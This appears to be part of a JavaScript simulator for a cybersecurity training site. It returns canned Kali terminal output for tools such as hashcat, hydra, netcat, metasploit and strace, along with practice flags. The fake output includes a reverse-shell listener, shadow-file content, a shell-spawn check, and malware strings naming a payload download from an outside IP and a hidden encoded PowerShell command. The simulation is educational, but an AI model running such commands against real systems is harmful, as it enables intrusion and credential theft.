    return `Session..........: hashcat<br>Status...........: Running<br>Hash.Mode........: ${mode} (${n})<br>Hash.Target......: hashes.txt<br>Guess.Base.......: File (rockyou.txt)<br>Candidates.#1....: password123 -> p@ssw0rd<br>Speed.#1.........: 22814 MH/s<br><br><span class="text-emerald-400">${crack1}</span><br>${crack2}<br><br>Session..........: cracked<br>Time.Elapsed.....: 0:00:0${Math.floor(Math.random()*8)+1}`;
  }],

  // ── msfconsole ─────────────────────────────────────────
  [/^(sudo )?msfconsole\b/, 1600, () =>
    `<span class="text-red-400">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .:okOOOkdc'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'cdkOOOko:.<br>
&nbsp;&nbsp;&nbsp; .xOOOOOOOOOOOOc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cOOOOOOOOOOOOx.<br>
&nbsp;&nbsp;:OOOOOOOOOOOOOOOk,&nbsp;&nbsp; ,kOOOOOOOOOOOOOOO:<br>
&nbsp;&nbsp;oOOOOOOOO.&nbsp;&nbsp;&nbsp;&nbsp;.oOOOOoOOOOl.&nbsp;&nbsp;&nbsp;&nbsp;,OOOOOOOOo<br>
&nbsp;&nbsp;dOOOOOOOO.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.cOOOOOc.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,OOOOOOOOx<br>
&nbsp;&nbsp;lOOOOOOOO.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;d;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ,OOOOOOOOl<br>
&nbsp;&nbsp;.OOOOOOOO.&nbsp;&nbsp; .;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;,OOOOOOOO.</span><br><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =[ <span class="text-white font-bold">metasploit v6.3.30-dev</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+ -- --=[ 2351 exploits - 1222 auxiliary - 413 post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+ -- --=[ 1386 payloads - 46 encoders - 11 nops&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+ -- --=[ 9 evasion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br><br>
<span class="text-emerald-400">msf6 &gt;</span>`
  ],

  // ── hydra ──────────────────────────────────────────────
  [/^hydra\b/, 2000, (r) => {
    const t = (r.match(/-l\s+(\S+)/) || ['','admin'])[1];
    return `Hydra v9.4 (c) 2022 by van Hauser/THC<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting @ ${now()}<br>[DATA] max 16 tasks per 1 server<br>[ATTEMPT] target 10.10.14.2 - login "${t}" - pass 1 of 14344398<br>...<br><span class="text-emerald-400 font-bold">[80][http-post-form] host: 10.10.14.2&nbsp;&nbsp; login: ${t}&nbsp;&nbsp; password: <span class="text-red-400">password123</span></span><br>1 of 1 target successfully completed, 1 valid password found`;
  }],

  // ── john ───────────────────────────────────────────────
  [/^john\b/, 1800, (r) => {
    return `John the Ripper 1.9.0-jumbo-1 (64-bit Linux)<br>Loaded 2 password hashes with 2 different salts<br>Using wordlist: rockyou.txt<br><span class="text-emerald-400">password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(admin)</span><br><span class="text-emerald-400">letmein&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(jane)</span><br>2g 0:00:00:03 DONE 2026/07/17 Session completed`;
  }],

  // ── gobuster / dirb ────────────────────────────────────
  [/^(dirb)\b/, 2200, (r) => {
    const t = (r.match(/http[^\s]+/) || ['http://10.10.14.2'])[0];
    return `<span class="text-cyan-400">DIRB starting against: ${t}</span><br>Found: <span class="text-emerald-400">/admin</span> (Status: 200) [Size: 4321]<br>Found: <span class="text-emerald-400">/login</span> (Status: 200) [Size: 1843]<br>Found: <span class="text-amber-400">/backup</span> (Status: 301) [Size: 234]<br>Found: <span class="text-emerald-400">/phpinfo.php</span> (Status: 200) [Size: 55123]<br>Found: <span class="text-red-400 font-bold">/config.bak</span> (Status: 200) [Size: 892]<br>Finished in ${rnd(8,25)}s`;
  }],

  // ── nikto ──────────────────────────────────────────────
  [/^nikto\b/, 2500, (r) => {
    const t = (r.match(/-h\s+(\S+)/) || ['',r.split(' ')[1] || '10.10.14.2'])[1];
    return `- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${t}<br>+ Target Hostname:&nbsp;&nbsp; ${t}<br>+ Target Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 80<br>+ <span class="text-red-400 font-bold">OSVDB-3092: /admin/: This might be interesting...</span><br>+ <span class="text-red-400">Apache/2.4.49 appears to be outdated (CVE-2021-41773)</span><br>+ <span class="text-amber-400">Retrieved x-powered-by header: PHP/7.4.3</span><br>+ 6544 requests: 0 error(s) and 4 item(s) reported on remote host`;
  }],

  // ── burpsuite ──────────────────────────────────────────
  [/^burpsuite\b/, 600, () => `<span class="text-amber-400">Burp Suite Professional v2023.10.3<br>[*] Loading extensions...<br>[*] Starting proxy listener on 127.0.0.1:8080<br>[*] Burp Suite is ready. Configure your browser to use 127.0.0.1:8080 as proxy.</span>`],

  // ── netcat / nc ────────────────────────────────────────
  [/^(nc|netcat|ncat)\b/, 1000, (r) => {
    if (r.includes('-l') || r.includes('-lvp') || r.includes('-lvnp')) {
      const port = (r.match(/\d{3,5}/) || ['4444'])[0];
      return `listening on [any] ${port} ...<br><span class="text-emerald-400">connect to [10.10.10.5] from (UNKNOWN) [10.10.14.2] 44312</span><br>$ whoami<br>www-data`;
    }
    return `(UNKNOWN) [10.10.14.2] 80 (http) open`;
  }],

  // ── tshark / tcpdump ───────────────────────────────────
  [/^(tshark|tcpdump)\b/, 900, (r) => {
    if (r.includes('-q') || r.includes('conv')) {
      return `IPv4 Conversations<br>═══════════════════════════════════<br>10.10.42.100 ↔ <span class="text-emerald-400 font-bold">192.168.1.55</span>&nbsp;&nbsp; packets=47&nbsp; bytes=18KB<br>10.10.42.100 ↔ 8.8.8.8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; packets=5&nbsp;&nbsp; bytes=320B`;
    }
    return `Capturing on eth0<br>1&nbsp;&nbsp; 0.000000 10.10.10.5 → 10.10.14.2&nbsp; TCP 74 [SYN]<br>2&nbsp;&nbsp; 0.041203 10.10.14.2 → 10.10.10.5&nbsp; TCP 74 [SYN, ACK]<br>3&nbsp;&nbsp; 0.041580 10.10.10.5 → 10.10.14.2&nbsp; HTTP GET /login.php HTTP/1.1<br>^C 3 packets captured`;
  }],

  // ── curl ───────────────────────────────────────────────
  [/^curl\b/, 600, (r) => {
    const t = (r.match(/https?:\/\/\S+/) || [r.split(' ').pop()])[0];
    if (r.includes('-I') || r.includes('--head')) {
      return `HTTP/1.1 200 OK<br>Date: ${new Date().toUTCString()}<br>Server: Apache/2.4.49 (Debian)<br>X-Powered-By: PHP/7.4.3<br>Content-Type: text/html; charset=UTF-8`;
    }
    return `&lt;!DOCTYPE html&gt;<br>&lt;html&gt;&lt;head&gt;&lt;title&gt;Login - Target Machine&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;&lt;form method="POST" action="/login.php"&gt;...<br><span class="text-gray-500">[retrieved ${t}]</span>`;
  }],

  // ── wget ────────────────────────────────────────────────
  [/^wget\b/, 800, (r) => {
    const file = r.split('/').pop() || 'file';
    return `--${now()}--&nbsp; ${r.split(' ').pop()}<br>Resolving host...<br>HTTP request sent, awaiting response... 200 OK<br>Length: 45192 (44K) [application/octet-stream]<br>Saving to: '<span class="text-emerald-400">${file}</span>'<br><br>${file}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[=====================================>] 44.13K&nbsp;&nbsp;215KB/s in 0.2s<br>${now()} (215 KB/s) - '${file}' saved`;
  }],

  // ── ssh ─────────────────────────────────────────────────
  [/^ssh\b/, 1200, (r) => {
    const host = (r.match(/@([\d.a-z]+)/i) || ['','10.10.14.2'])[1];
    return `The authenticity of host '${host}' can't be established.<br>RSA key fingerprint is SHA256:a7/ZzK2p2f4J+Tq==.<br>Are you sure you want to continue connecting? (yes/no) yes<br>Warning: Permanently added '${host}' to the list of known hosts.<br><span class="text-emerald-400">Connected to ${host}</span><br>root@target:~# `;
  }],

  // ── whoami / id ────────────────────────────────────────
  [/^whoami$/, 0, () => 'root'],
  [/^id$/, 0, () => 'uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom)'],

  // ── pwd ────────────────────────────────────────────────
  [/^pwd$/, 0, () => '/root'],

  // ── uname ──────────────────────────────────────────────
  [/^uname\b/, 0, () => 'Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.1.27-1kali1 (2023-05-12) x86_64 GNU/Linux'],

  // ── hostname ───────────────────────────────────────────
  [/^hostname$/, 0, () => 'kali'],

  // ── ip / ifconfig ─────────────────────────────────────
  [/^(ip\s+a|ip\s+addr|ifconfig)\b/, 0, () =>
    `1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536<br>&nbsp;&nbsp;inet 127.0.0.1/8 scope host lo<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500<br>&nbsp;&nbsp;inet <span class="text-emerald-400 font-bold">10.10.10.5</span>/24 brd 10.10.10.255 scope global eth0<br>&nbsp;&nbsp;inet6 fe80::250:56ff:fe96:1234/64 scope link eth0`
  ],

  // ── ping ───────────────────────────────────────────────
  [/^ping\b/, 1000, (r, p) => {
    const t = p.find(x => !x.startsWith('-') && x !== 'ping') || '8.8.8.8';
    return `PING ${t} 56(84) bytes of data.<br>64 bytes from ${t}: icmp_seq=1 ttl=117 time=${rnd(8,20)} ms<br>64 bytes from ${t}: icmp_seq=2 ttl=117 time=${rnd(8,20)} ms<br>64 bytes from ${t}: icmp_seq=3 ttl=117 time=${rnd(8,20)} ms<br>^C<br>--- ${t} ping statistics ---<br>3 packets transmitted, 3 received, 0% packet loss`;
  }],

  // ── cd ─────────────────────────────────────────────────
  [/^cd\b/, 0, (r) => {
    let d = r.replace(/^cd\s*/, '').trim();
    if (!d || d === '~') {
      window.kaliDir = '~';
      return '';
    }
    
    // Resolve basic paths
    if (d === '/') {
        window.kaliDir = '/';
    } else if (d === '..') {
        if (window.kaliDir === '~') window.kaliDir = '/';
        else if (window.kaliDir !== '/') {
            const pts = window.kaliDir.split('/').filter(Boolean);
            pts.pop();
            window.kaliDir = pts.length ? '/' + pts.join('/') : '/';
        }
    } else {
        if (d.startsWith('/')) {
            window.kaliDir = d;
        } else {
            if (window.kaliDir === '/') window.kaliDir = '/' + d;
            else if (window.kaliDir === '~') window.kaliDir = '~/' + d;
            else window.kaliDir += '/' + d;
        }
    }
    
    // Clean trailing slashes
    if (window.kaliDir.length > 1 && window.kaliDir.endsWith('/')) {
        window.kaliDir = window.kaliDir.slice(0, -1);
    }
    
    return '';
  }],

  // ── pwd ────────────────────────────────────────────────
  [/^pwd\b/, 0, () => {
    return window.kaliDir === '~' ? '/root' : window.kaliDir.replace(/^~/, '/root');
  }],

  // ── ls ─────────────────────────────────────────────────
  [/^ls\b/, 0, (r) => {
    const path = r.replace(/^ls\s*/, '').replace(/-[la]+\s*/g,'').trim();
    if (path.includes('wordlists')) return `<span class="text-blue-400">dirb/</span>&nbsp;&nbsp;<span class="text-blue-400">dirbuster/</span>&nbsp;&nbsp;<span class="text-emerald-400 font-bold">rockyou.txt</span>&nbsp;&nbsp;<span class="text-blue-400">seclists/</span>&nbsp;&nbsp;<span class="text-blue-400">wfuzz/</span>`;
    if (path.includes('etc')) return `passwd&nbsp;&nbsp;shadow&nbsp;&nbsp;hosts&nbsp;&nbsp;hostname&nbsp;&nbsp;<span class="text-blue-400">apt/</span>&nbsp;&nbsp;<span class="text-blue-400">network/</span>&nbsp;&nbsp;<span class="text-blue-400">ssh/</span>`;
    if (path.includes('usr/bin')) return `nmap&nbsp;&nbsp;metasploit-framework&nbsp;&nbsp;hashcat&nbsp;&nbsp;john&nbsp;&nbsp;hydra&nbsp;&nbsp;gobuster&nbsp;&nbsp;nikto&nbsp;&nbsp;sqlmap`;
    if (path.includes('tmp')) return `&lt;empty&gt;`;
    const la = r.includes('-la') || r.includes('-al') || r.includes('-l');
    if (la) return `total 32<br>drwx------ 5 root root 4096 Jul 17 14:00 <span class="text-blue-400">.</span><br>drwxr-xr-x 20 root root 4096 Jul 17 09:00 <span class="text-blue-400">..</span><br>-rw-r--r-- 1 root root&nbsp;&nbsp;892 Jul 17 13:52 target.txt<br>-rw-r--r-- 1 root root 2.4M Jul 16 18:00 capture.pcap<br>drwxr-xr-x 2 root root 4096 Jul 17 10:00 <span class="text-blue-400">tools</span><br>drwxr-xr-x 2 root root 4096 Jul 17 10:00 <span class="text-blue-400">payloads</span><br>-rw-r--r-- 1 root root&nbsp;&nbsp;256 Jul 17 14:00 notes.txt`;
    return `<span class="text-blue-400">tools/</span>&nbsp;&nbsp;<span class="text-blue-400">payloads/</span>&nbsp;&nbsp;<span class="text-blue-400">scripts/</span>&nbsp;&nbsp;target.txt&nbsp;&nbsp;capture.pcap&nbsp;&nbsp;notes.txt`;
  }],

  // ── cat ────────────────────────────────────────────────
  [/^cat\b/, 0, (r) => {
    const f = r.replace(/^cat\s+/,'').trim();
    if (f.includes('passwd'))   return `root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>jane:x:1001:1001:,,,:/home/jane:/bin/bash`;
    if (f.includes('shadow'))   return `root:$6$rounds=5000$usesomesalt$HASH_GOES_HERE:19000:0:99999:7:::<br>jane:$6$rounds=5000$thmsalt$JANES_HASH:19500:0:99999:7:::`;
    if (f.includes('root.txt') || f.includes('flag.txt')) {
       let flag = 'THM{root_fl4g_f0und}';
       if (typeof activeRoom !== 'undefined' && activeRoom) {
         if (activeRoom.id === 'privesc') flag = 'THM{pr1v3sc_m4st3r}';
         else if (activeRoom.id === 'linux') flag = 'THM{l1nux_b4s1cs}';
         else if (activeRoom.id === 'malware') flag = 'THM{m4lw4r3_4n4lys1s}';
       }
       return `<span class="text-yellow-400 font-bold">${flag}</span>`;
    }
    if (f.includes('user.txt')) return `<span class="text-cyan-400 font-bold">THM{us3r_fl4g_w0n}</span>`;
    if (f.includes('hosts'))    return `127.0.0.1&nbsp;&nbsp;localhost<br>10.10.14.2&nbsp;&nbsp;target.thm<br>10.10.10.5&nbsp;&nbsp;kali`;
    if (f.includes('crontab'))  return `# m h dom mon dow command<br>*/5 * * * * root /opt/backup.sh<br>0 * * * * root /usr/sbin/cleanup.sh`;
    if (f.includes('bash_history')) return `nmap -sV 10.10.14.2<br>sudo msfconsole<br>hashcat -m 1000 hashes.txt rockyou.txt<br>ssh root@10.10.14.2<br>cat /root/root.txt`;
    if (f.includes('target'))   return `Target: 10.10.14.2<br>User: jane<br>Pass: [NOT PROVIDED] — crack the hash`;
    if (f.includes('/proc/version')) return `Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc version 12.2.0)`;
    if (f.includes('notes'))    return `[+] Jane has sudo on /usr/bin/python3<br>[+] SUID found on /usr/bin/find<br>[!] Target IP: 10.10.14.2`;
    return `<span class="text-gray-400">cat: ${f}: No such file or directory</span>`;
  }],

  // ── echo ────────────────────────────────────────────────
  [/^echo\b/, 0, (r) => {
    const content = r.replace(/^echo\s+/,'');
    if (content.includes('$PATH')) return `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games`;
    if (content.includes('$USER')) return `root`;
    if (content.includes('$HOME')) return `/root`;
    if (content.includes('$SHELL')) return `/bin/bash`;
    return content.replace(/['"]/g,'');
  }],

  // ── sudo ────────────────────────────────────────────────
  [/^sudo -l$/, 0, () =>
    `Matching Defaults entries for jane:<br>&nbsp;&nbsp;&nbsp; env_reset, mail_badpass<br><br>User jane may run the following commands:<br>&nbsp;&nbsp;&nbsp; (root) NOPASSWD: <span class="text-emerald-400 font-bold">/usr/bin/python3</span>`
  ],

  [/^sudo\b/, 800, (r) => {
    const subcmd = r.replace(/^sudo\s+/,'');
    return `[sudo] password for root: <br><span class="text-emerald-400">Running as root: ${subcmd}</span>`;
  }],

  // ── python ──────────────────────────────────────────────
  [/^python3?\b/, 400, (r) => {
    if (r.includes('-c')) {
      const code = (r.match(/-c\s+["'](.+)["']/) || ['',''])[1];
      if (code.includes('import os') || code.includes('spawn')) return `<span class="text-emerald-400 font-bold">root@kali:/# &nbsp;[Shell spawned!]</span>`;
      return `<span class="text-emerald-400">Executing: ${code}</span>`;
    }
    return `Python 3.11.2 (main, Mar 13 2023, 12:18:29)<br>[GCC 12.2.0] on linux<br>Type "help", "copyright" for more information.<br>&gt;&gt;&gt; `;
  }],

  // ── find ────────────────────────────────────────────────
  [/^find\b/, 600, (r) => {
    if (r.includes('-perm') && r.includes('4000')) return `/usr/bin/sudo<br>/usr/bin/newgrp<br><span class="text-red-400 font-bold">/usr/bin/find</span><br>/usr/bin/passwd<br>/usr/bin/mount<br>/usr/bin/su`;
    if (r.includes('-name') && r.includes('*.txt')) return `/root/target.txt<br>/root/notes.txt<br>/home/jane/user.txt<br>/opt/readme.txt`;
    if (r.includes('-type f') && r.includes('writable')) return `/tmp/<br>/var/tmp/<br>/opt/backup.sh`;
    return `/root/<br>/home/<br>/etc/<br>/var/`;
  }],

  // ── grep ────────────────────────────────────────────────
  [/^grep\b/, 0, (r, p) => {
    const pattern = p[1] || 'PATTERN';
    if (pattern.includes('pass')) return `config.php:&nbsp;&nbsp;&nbsp; $db_pass = <span class="text-red-400 font-bold">"s3cr3t_p4ssw0rd"</span>;<br>login.php:&nbsp;&nbsp;&nbsp;&nbsp; if ($pass == "admin123")`;
    if (pattern.includes('root')) return `passwd:root:x:0:0:root:/root:/bin/bash<br>group:root:x:0:`;
    return `<span class="text-emerald-400">[grep] Found matches for: ${pattern}</span>`;
  }],

  // ── history ─────────────────────────────────────────────
  [/^history$/, 0, () =>
    `&nbsp;&nbsp;1&nbsp;&nbsp;nmap -sV 10.10.14.2<br>&nbsp;&nbsp;2&nbsp;&nbsp;sqlmap -u "http://10.10.42.5/login.php?id=1" --dbs<br>&nbsp;&nbsp;3&nbsp;&nbsp;msfconsole<br>&nbsp;&nbsp;4&nbsp;&nbsp;hashcat -m 0 hash.txt rockyou.txt<br>&nbsp;&nbsp;5&nbsp;&nbsp;hydra -l admin -P rockyou.txt 10.10.14.2 http-post-form<br>&nbsp;&nbsp;6&nbsp;&nbsp;gobuster dir -u http://10.10.14.2 -w /usr/share/wordlists/dirb/common.txt<br>&nbsp;&nbsp;7&nbsp;&nbsp;cat /root/root.txt<br>&nbsp;&nbsp;8&nbsp;&nbsp;history`
  ],

  // ── cal ─────────────────────────────────────────────────
  [/^cal$/, 0, () => {
    const d = new Date();
    return `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${d.toLocaleString('en',{month:'long'})} ${d.getFullYear()}<br>Mo Tu We Th Fr Sa Su<br>&nbsp;1&nbsp;&nbsp; 2&nbsp;&nbsp; 3&nbsp;&nbsp; 4&nbsp;&nbsp; 5&nbsp;&nbsp; 6&nbsp;&nbsp; 7<br>&nbsp;8&nbsp;&nbsp; 9&nbsp; 10&nbsp; 11&nbsp; 12&nbsp; 13&nbsp; 14<br>15&nbsp; 16&nbsp; <span class="bg-emerald-900 text-emerald-400 px-1">17</span>&nbsp; 18&nbsp; 19&nbsp; 20&nbsp; 21`;
  }],

  // ── mkdir ───────────────────────────────────────────────
  [/^mkdir\b/, 0, (r) => {
    const d = r.split(' ').pop();
    return `<span class="text-emerald-400">[+] Created: ${d}</span>`;
  }],

  // ── cd ──────────────────────────────────────────────────
  [/^cd\b/, 0, (r) => {
    const d = r.replace(/^cd\s*/,'') || '~';
    return `<span class="text-gray-500">[Changed directory to ${d}]</span>`;
  }],

  // ── env / printenv ──────────────────────────────────────
  [/^(env|printenv)$/, 0, () =>
    `SHELL=/bin/bash<br>HOME=/root<br>USER=root<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>TERM=xterm-256color<br>LANG=en_US.UTF-8`
  ],

  // ── ps ──────────────────────────────────────────────────
  [/^ps\b/, 0, () =>
    `PID&nbsp;&nbsp; TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TIME CMD<br>&nbsp;&nbsp; 1 pts/0&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 bash<br>&nbsp;139 pts/0&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 nmap<br>&nbsp;212 pts/0&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 ps`
  ],

  // ── netstat / ss ────────────────────────────────────────
  [/^(netstat|ss)\b/, 0, () =>
    `Active Internet connections<br>Proto Recv-Q Send-Q Local Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Foreign Address<br>tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 0.0.0.0:22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN<br>tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 0.0.0.0:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LISTEN<br>tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 10.10.10.5:45231&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.10.14.2:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESTABLISHED`
  ],

  // ── whois ────────────────────────────────────────────────
  [/^whois\b/, 800, (r, p) => {
    const d = p[1] || 'example.com';
    return `Domain Name: ${d.toUpperCase()}<br>Registrar: GoDaddy.com, LLC<br>Creation Date: 2019-01-15<br>Registrant Country: US<br>Name Server: ns1.${d}<br>DNSSEC: unsigned`;
  }],

  // ── dig / host / nslookup ───────────────────────────────
  [/^(dig|host|nslookup)\b/, 500, (r, p) => {
    const d = p[1] || 'example.com';
    return `;; ANSWER SECTION:<br>${d}.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 300&nbsp;&nbsp; IN&nbsp;&nbsp; A&nbsp;&nbsp;&nbsp;&nbsp; <span class="text-emerald-400">93.184.216.34</span><br>${d}.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 300&nbsp;&nbsp; IN&nbsp;&nbsp; MX&nbsp;&nbsp;&nbsp; mail.${d}`;
  }],

  // ── apt ──────────────────────────────────────────────────
  [/^(apt|apt-get)\b/, 1200, (r) => {
    if (r.includes('install')) {
      const pkg = r.split(' ').pop();
      return `Reading package lists... Done<br>Building dependency tree... Done<br>The following NEW packages will be installed: ${pkg}<br>Setting up ${pkg}... <span class="text-emerald-400">done</span>`;
    }
    if (r.includes('update')) return `Get:1 http://kali.download/kali kali-rolling InRelease<br>Fetched 41.1 MB in 8s<br>Reading package lists... <span class="text-emerald-400">Done</span>`;
    return `apt 2.5.3 (amd64)<br>Usage: apt-get install &lt;package&gt;`;
  }],

  // ── git ──────────────────────────────────────────────────
  [/^git\b/, 400, (r) => {
    if (r.includes('clone')) return `Cloning into '${r.split('/').pop().replace('.git','')}'...<br>remote: Counting objects: 1234, done.<br>Receiving objects: 100% (1234/1234) — 45.2 MiB | 3.1 MiB/s<br><span class="text-emerald-400">done.</span>`;
    if (r.includes('status')) return `On branch main<br>nothing to commit, working tree clean`;
    if (r.includes('log')) return `commit a4b2c3d (HEAD -> main)<br>Author: root &lt;root@kali&gt;<br>Date:&nbsp;&nbsp; Thu Jul 17 2026<br>&nbsp;&nbsp;&nbsp;&nbsp;Initial commit`;
    return `usage: git [--version] [--help] [--exec-path[=<path>]] <command> [<args>]`;
  }],

  // ── service / systemctl ─────────────────────────────────
  [/^(service|systemctl)\b/, 400, (r) => {
    if (r.includes('start') || r.includes('restart')) return `<span class="text-emerald-400">[+] Service started successfully</span>`;
    if (r.includes('status')) return `● apache2.service - The Apache HTTP Server<br>&nbsp;&nbsp;&nbsp;Loaded: loaded (/lib/systemd/system/apache2.service)<br>&nbsp;&nbsp;&nbsp;Active: <span class="text-emerald-400 font-bold">active (running)</span> since Thu 2026-07-17`;
    return `<span class="text-emerald-400">[+] OK</span>`;
  }],

  // ── setoolkit ────────────────────────────────────────────
  [/^setoolkit$|^se-toolkit$/, 600, () =>
    `<span class="text-red-400">Social-Engineer Toolkit (SET) version 8.0.3<br>Created by: David Kennedy (ReL1K)<br><br>[---]  The Social-Engineer Toolkit (SET)  [---]<br>1) Social-Engineering Attacks<br>2) Penetration Testing (Fast-Track)<br>3) Third Party Modules<br>4) Update the Social-Engineer Toolkit<br>99) Exit the Social-Engineer Toolkit<br><br>set&gt; </span>`
  ],

  // ── strings ────────────────────────────────────────
  [/^strings\b/, 800, (r) => {
    const f = (r.match(/\S+\.(?:exe|elf|bin|out|raw|dump)/) || ['malware.exe'])[0];
    return `<span class="text-red-300">${f}: ELF 64-bit LSB executable, x86-64</span><br>` +
      `/bin/sh<br>GLIBC_2.14<br>` +
      `<span class="text-amber-400">http://185.220.101.45:4444/payload.bin</span><br>` +
      `<span class="text-amber-400">cmd.exe /c powershell -nop -w hidden -enc</span><br>` +
      `C:\\Windows\\Temp\\svchost32.exe<br>` +
      `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>` +
      `Global\\MalwareMutex_v2<br>` +
      `<span class="text-emerald-400">[+] Extracted 247 printable strings from ${f}</span>`;
  }],

  // ── strace / ltrace ─────────────────────────────────
  [/^(strace|ltrace)\b/, 1200, (r) => {
    const tool = r.startsWith('ltrace') ? 'ltrace' : 'strace';
    return `execve("./malware", ["./malware"], 0x7fff... /* 23 vars */) = 0<br>` +
      `openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3<br>` +
      `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4<br>` +
      `<span class="text-red-400">connect(4, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.220.101.45")}, 16) = 0</span><br>` +
      `write(4, "\\x00\\x00\\x00\\x2f\\x6c\\x69\\x62", 7) = 7<br>` +
      `<span class="text-amber-400">open("/tmp/svchost32.exe", O_WRONLY|O_CREAT) = 5</span><br>` +
      `<span class="text-emerald-400">[+] ${tool} complete. Suspicious: network connect + file drop detected!</span>`;
  }],

  // ── volatility ────────────────────────────────────────
  [/^volatility\b|^vol\.py\b/, 2000, (r) => {
    if (r.includes('imageinfo')) return `Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug : Determining profile...<br><span class="text-emerald-400">Suggested Profile(s): Win10x64_19041, Win10x64</span><br>AS Layer1: WindowsAMD64PagedMemory<br>KDBG: 0xf80002a430a0L`;
